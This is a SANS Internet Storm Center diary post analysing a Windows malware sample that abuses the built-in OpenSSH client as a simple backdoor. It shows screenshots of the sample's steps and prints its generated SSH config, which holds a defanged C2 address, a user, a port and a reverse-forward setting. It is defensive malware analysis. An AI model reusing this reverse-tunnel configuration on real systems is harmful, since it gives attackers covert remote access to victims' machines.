---
title: Simple SSH Backdoor, (Mon, Jun 2nd)
url: https://isc.sans.edu/diary/rss/32000
source: SANS Internet Storm Center, InfoCON: green
date: 2025-06-03
fetch_date: 2025-10-06T22:56:18.483529
---

# Simple SSH Backdoor, (Mon, Jun 2nd)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31998)
* [next](/diary/32006)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Simple SSH Backdoor](/forums/diary/Simple%2BSSH%2BBackdoor/32000/)

**Published**: 2025-06-02. **Last Updated**: 2025-06-02 05:20:14 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Simple%2BSSH%2BBackdoor/32000/#comments)

For most system and network administrators, the free SSH client Putty has been their best friend for years! This tool was also (ab)used by attackers that deployed a trojanized version[[1](https://hivepro.com/threat-advisory/unc4034-slips-in-a-backdoor-with-trojanized-putty/)]. Microsoft had the good idea to include OpenSSH (beta version) in Windows 10 Fall Creators Update. One year later, it became a default component with Windows 10 version 1803. I remember the join of type for the first time "ssh" or "scp" in a cmd.exe! SSH is a very powerful tool that can be used in multiple ways, and it was de-facto categorized as a "LOLBIN"[[2](https://lolbas-project.github.io/lolbas/Binaries/Ssh/)].

I'm hunting for scripts or binaries that refer to "C:\Windows\System32\OpenSSH\ssh.exe" and found an interesting sample. The file was uploaded on VT as "dllhost.exe" (SHA256:b701272e20db5e485fe8b4f480ed05bcdba88c386d44dc4a17fe9a7b6b9c026b) with a score of 18/71[[3](https://www.virustotal.com/gui/file/b701272e20db5e485fe8b4f480ed05bcdba88c386d44dc4a17fe9a7b6b9c026b/details)]. It tries to abuse ssh.exe to implement a simple backdoor on the victim's computer. It did not work when I started to analyze it on my REMWorkstation (the Windows system we used in FOR610[[4](https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/)]), I had to install OpenSSH manually. Let's review how it behaves.

First, the malware tries to start an existing "SSHService" service:

![](https://isc.sans.edu/diaryimages/images/isc-20250530-1.png)

If it's not successfull, the malware tries to read a registry key (SOFTWARE\SSHservice) and access the previously saved random port:

![](https://isc.sans.edu/diaryimages/images/isc-20250530-2.png)

If not found (first malware execution), a random port is generated:

![](https://isc.sans.edu/diaryimages/images/isc-20250530-3.png)

Then saved:

![](https://isc.sans.edu/diaryimages/images/isc-20250530-4.png)

A SSH configuration file is created, it contains the attacker's C2:

![](https://isc.sans.edu/diaryimages/images/isc-20250530-5.png)

Now the malware enters an infinite loop and performs a long sleep at each iteration:

![](https://isc.sans.edu/diaryimages/images/isc-20250530-6.png)

Then it tries to launch a ssh.exe process with the generated configuration file:

![](https://isc.sans.edu/diaryimages/images/isc-20250530-8.png)

```

The malware creates the configuration file in c:\windows\temp\config:
Host version
    Hostname 193[.]187[.]174[.]3
    User ugueegfueuagu17t1424acs
    Port 443
    ServerAliveInterval 60
    ServerAliveCountMax 15
    RemoteForward 40909
    StrictHostKeyChecking no
    SessionType None
```

The C2 server was down but the configuration file in invalid, the line 7, the RemoteForward syntax is:

```

RemoteForward [bind_address:]port local_address:local_port
```

Conclusion: OpenSSH being available on most Windows hosts for a while, it deserves some monitoring! (scp.exe is a nice way to exfiltrate data)

[1] <https://hivepro.com/threat-advisory/unc4034-slips-in-a-backdoor-with-trojanized-putty/>
[2] <https://lolbas-project.github.io/lolbas/Binaries/Ssh/>
[3] <https://www.virustotal.com/gui/file/b701272e20db5e485fe8b4f480ed05bcdba88c386d44dc4a17fe9a7b6b9c026b/details>
[4] <https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Backdoor](/tag.html?tag=Backdoor) [Malware](/tag.html?tag=Malware) [OpenSSH](/tag.html?tag=OpenSSH) [sshexe](/tag.html?tag=sshexe)

[0 comment(s)](/diary/Simple%2BSSH%2BBackdoor/32000/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31998)
* [next](/diary/32006)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)